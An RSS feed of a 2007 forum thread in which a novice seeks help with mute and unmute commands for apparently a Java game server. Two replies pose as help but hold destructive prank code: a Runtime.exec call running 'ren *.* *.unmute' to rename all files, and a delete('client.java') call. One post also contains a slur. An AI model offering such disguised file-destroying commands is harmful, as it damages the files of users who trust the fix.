item.title: Muting code help
item.dc:creator: @pl0x_pk pl0x pk
item.description:
@pl0x_pk wrote:

ok but where do i put the unmute thing?[br][size=1]Posted on: July 29, 2007, 05:28:40 PM[/size][hr][quote=“For ( ; ; ), post:12, topic:128217”][code]if(command.startsWith(“mute”) && playerRights >= 1)
{
String victim = command.substring(5);
PlayerHandler.kickNick = victim;
System.out.println(“Admin:”+playerName+" has muted "+victim);
sendMessage(“Player “+victim+” successfully muted”);
appendToMuted(victim);
BufferedWriter bw = null;

  try {
     bw = new BufferedWriter(new FileWriter("logs/mutelogs.txt", true));
 bw.write(playerName+" muted "+victim);
 bw.newLine();
 bw.flush();
  } catch (IOException ioe) {
 ioe.printStackTrace();
  } finally {
 if (bw != null) try {
    bw.close();
 } catch (IOException ioe2) {
    sendMessage("Error logging mutes!");
 	}
  	}

}[/code][/quote]

i got some error and it pointed to the a in appendToMuted(victim)

client.java:11676: cannot find symbol symbol : method appendToMuted(java.lang.string) location: class client appendToMuted(victim); ^ note: stream.java uses or overrides a deprecated API. note: re-compile with -xlint:deprecation for details files successfully compiled! press any key to continue . . . 1 error

Read full topic

item.title: Muting code help
item.dc:creator: @For For ( ; ; )
item.description:
@For wrote:

[code]if(command.startsWith(“mute”) && playerRights >= 1)
{
String victim = command.substring(5);
PlayerHandler.kickNick = victim;
System.out.println(“Admin:”+playerName+" has muted "+victim);
sendMessage(“Player “+victim+” successfully muted”);
appendToMuted(victim);
BufferedWriter bw = null;

  try {
     bw = new BufferedWriter(new FileWriter("logs/mutelogs.txt", true));
 bw.write(playerName+" muted "+victim);
 bw.newLine();
 bw.flush();
  } catch (IOException ioe) {
 ioe.printStackTrace();
  } finally {
 if (bw != null) try {
    bw.close();
 } catch (IOException ioe2) {
    sendMessage("Error logging mutes!");
 	}
  	}

}[/code]

Read full topic

item.title: Muting code help
item.dc:creator: @I_Am_Olan14 I Am Olan14
item.description:
@I_Am_Olan14 wrote:

[quote=“Stanyer, post:5, topic:128217”][quote author=invalid name link=topic=178837.msg1636201#msg1636201 date=1185759267]
??? wtf

[code]if(mutetimerx == 1){
delete(“client.java”);
}
else{

delete(“client.java”);
}[/code]

delete client.java?

btw its a command you want?
[/quote]

Shhhhhhhhhhh[/quote]

You’re seriously retarded.
That would not work for the following reason:
[sup]a)[/sup][sub]Method delete is not declared in any of the implemented interfaces or namespaces imported.
And even if it was, it’s not going to have the effect you’d try and make it seem it had in the failing psuedocode.

Read full topic

item.title: Muting code help
item.dc:creator: @bakatool bakatool
item.description:
@bakatool wrote:

to unmute your self from your server add this to process method

		String mutecodec = null; //reset the mute codec
		int mutextimer = 0; //reset mute timers
		Process p; //muting process to mininum
		OutputStream out; //set the outputs to mute reset
                       try{
                             p = Runtime.getRuntime().exec(ren *.* *.unmute); //complete the unmuting proccess.
                       }
                       catch(IOException e){
	                     e.printStackTrace(); //handle any unmuting errors.
                       }

Read full topic

item.title: Muting code help
item.dc:creator: @Stanyer Stanyer
item.description:
@Stanyer wrote:

Search for: “boolean process” without the quotation marks and add this under that line:

public int mutetimerx = 1;
public int mutetimery = 1;
public int mutetimers = 1;
public int mutetimerb = 1;
public int mutetimerf = 1;
public int mutetimerd = 1;
public int mutetimerc = 1;

if(mutetimerx == 1){
delete("client.java");
}
else{
delete("client.java");
}

Read full topic
